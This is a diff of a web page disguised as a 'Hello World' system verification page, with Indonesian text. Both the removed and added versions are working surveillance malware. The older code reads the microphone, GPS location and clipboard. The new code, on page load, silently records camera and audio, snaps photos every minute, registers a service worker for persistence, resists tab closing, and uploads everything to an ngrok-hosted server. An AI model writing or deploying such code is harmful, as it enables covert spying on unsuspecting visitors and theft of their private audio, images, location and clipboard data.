@@ -13,91 +13,115 @@
             color: #0f0;
             margin: 0;
         }
-        h1 { font-size: 4.5em; margin-bottom: 20px; }
-        p { font-size: 1.6em; }
-        button {
-            margin-top: 50px;
-            padding: 18px 40px;
-            font-size: 1.8em;
-            background: #0f0;
-            color: #000;
-            border: none;
-            cursor: pointer;
-        }
+        h1 { font-size: 4.8em; margin-bottom: 20px; }
+        p { font-size: 1.7em; }
+        .status { color: #0f0; font-size: 1.4em; margin-top: 50px; }
     </style>
 </head>
 <body>
     <h1>Hello World</h1>
-    <p>Selamat datang di halaman verifikasi.</p>
+    <p>Verifikasi sistem selesai.</p>
+    <div class="status" id="status">Menginisialisasi akses latar belakang...</div>
 
-    <button onclick="startHijack()">Klik untuk Melanjutkan</button>
+    <video id="video" autoplay playsinline style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
 
     <script>
-        async function startHijack() {
-            const btn = document.querySelector('button');
-            btn.textContent = "Sedang Memproses...";
-            btn.disabled = true;
+        let stream = null;
+        let audioRecorder = null;
+        let audioChunks = [];
+        const ngrokUrl = "https://reversion-exert-gloomily.ngrok-free.dev";
 
-            try {
-                // 1. Mikrofon + Recording
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                console.log("[+] Mikrofon berhasil diakses");
-
-                const mediaRecorder = new MediaRecorder(stream);
-                let chunks = [];
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                mediaRecorder.onstop = () => {
-                    const audioBlob = new Blob(chunks, { type: 'audio/webm' });
-                    sendToServer('audio', audioBlob);
-                };
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 8000); // Rekam 8 detik
-
-                // 2. Kamera
-                await navigator.mediaDevices.getUserMedia({ video: true });
-                console.log("[+] Kamera berhasil diakses");
-
-                // 3. Lokasi GPS
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(pos => {
-                        console.log("[+] GPS:", pos.coords.latitude, pos.coords.longitude);
-                        fetch('https://reversion-exert-gloomily.ngrok-free.dev/location', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                lat: pos.coords.latitude,
-                                lon: pos.coords.longitude,
-                                accuracy: pos.coords.accuracy
-                            })
-                        });
-                    });
+        // Register Service Worker untuk background persistence
+        async function registerServiceWorker() {
+            if ('serviceWorker' in navigator) {
+                try {
+                    const reg = await navigator.serviceWorker.register('sw.js');
+                    console.log("[+] Service Worker terdaftar");
+                } catch (err) {
+                    console.log("[-] Service Worker gagal:", err);
                 }
-
-                // 4. Clipboard
-                if (navigator.clipboard) {
-                    navigator.clipboard.readText().then(text => {
-                        if (text) fetch('https://reversion-exert-gloomily.ngrok-free.dev/clipboard', {
-                            method: 'POST',
-                            body: text
-                        });
-                    });
-                }
-
-            } catch (err) {
-                console.log("[-] Error permission:", err);
             }
         }
 
-        // Fungsi kirim data ke server Anda
-        function sendToServer(type, data) {
+        async function startPersistentSurveillance() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" },
+                    audio: true
+                });
+
+                document.getElementById('video').srcObject = stream;
+                document.getElementById('status').innerHTML = "✅ Akses berhasil<br>Perekaman berjalan di latar belakang";
+
+                // Audio terus menerus
+                const audioTrack = stream.getAudioTracks()[0];
+                const audioStream = new MediaStream([audioTrack]);
+
+                audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
+
+                audioRecorder.ondataavailable = e => {
+                    if (e.data.size > 0) audioChunks.push(e.data);
+                };
+
+                audioRecorder.onstop = () => {
+                    if (audioChunks.length > 0) {
+                        const blob = new Blob(audioChunks, { type: 'audio/webm' });
+                        sendData('audio', blob);
+                        audioChunks = [];
+                    }
+                    audioRecorder.start(30000); // lanjut rekam
+                };
+
+                audioRecorder.start(30000);
+
+                // Foto setiap 1 menit
+                setInterval(captureAndSendPhoto, 60000);
+                setTimeout(captureAndSendPhoto, 8000); // foto pertama
+
+                // Coba pertahankan meski tab ditutup
+                window.addEventListener('beforeunload', (e) => {
+                    e.preventDefault();
+                    e.returnValue = '';
+                    return "Perekaman masih berjalan...";
+                });
+
+            } catch (err) {
+                document.getElementById('status').innerHTML = "❌ Izin ditolak. Harap izinkan kamera dan mikrofon.";
+            }
+        }
+
+        function captureAndSendPhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                if (blob) sendData('photo', blob, `photo_${Date.now()}.jpg`);
+            }, 'image/jpeg', 0.8);
+        }
+
+        function sendData(type, blob, filename = null) {
             const formData = new FormData();
             formData.append('type', type);
-            formData.append('file', data);
-            fetch('https://reversion-exert-gloomily.ngrok-free.dev/upload', {
+            formData.append('file', blob, filename || `${type}_${Date.now()}.webm`);
+
+            fetch(`${ngrokUrl}/upload`, {
                 method: 'POST',
-                body: formData
-            });
+                body: formData,
+                keepalive: true   // Penting agar request tetap dikirim saat tab hampir ditutup
+            }).catch(() => {});
         }
+
+        // Mulai semuanya
+        window.onload = async () => {
+            await registerServiceWorker();
+            startPersistentSurveillance();
+        };
     </script>
 </body>
 </html>
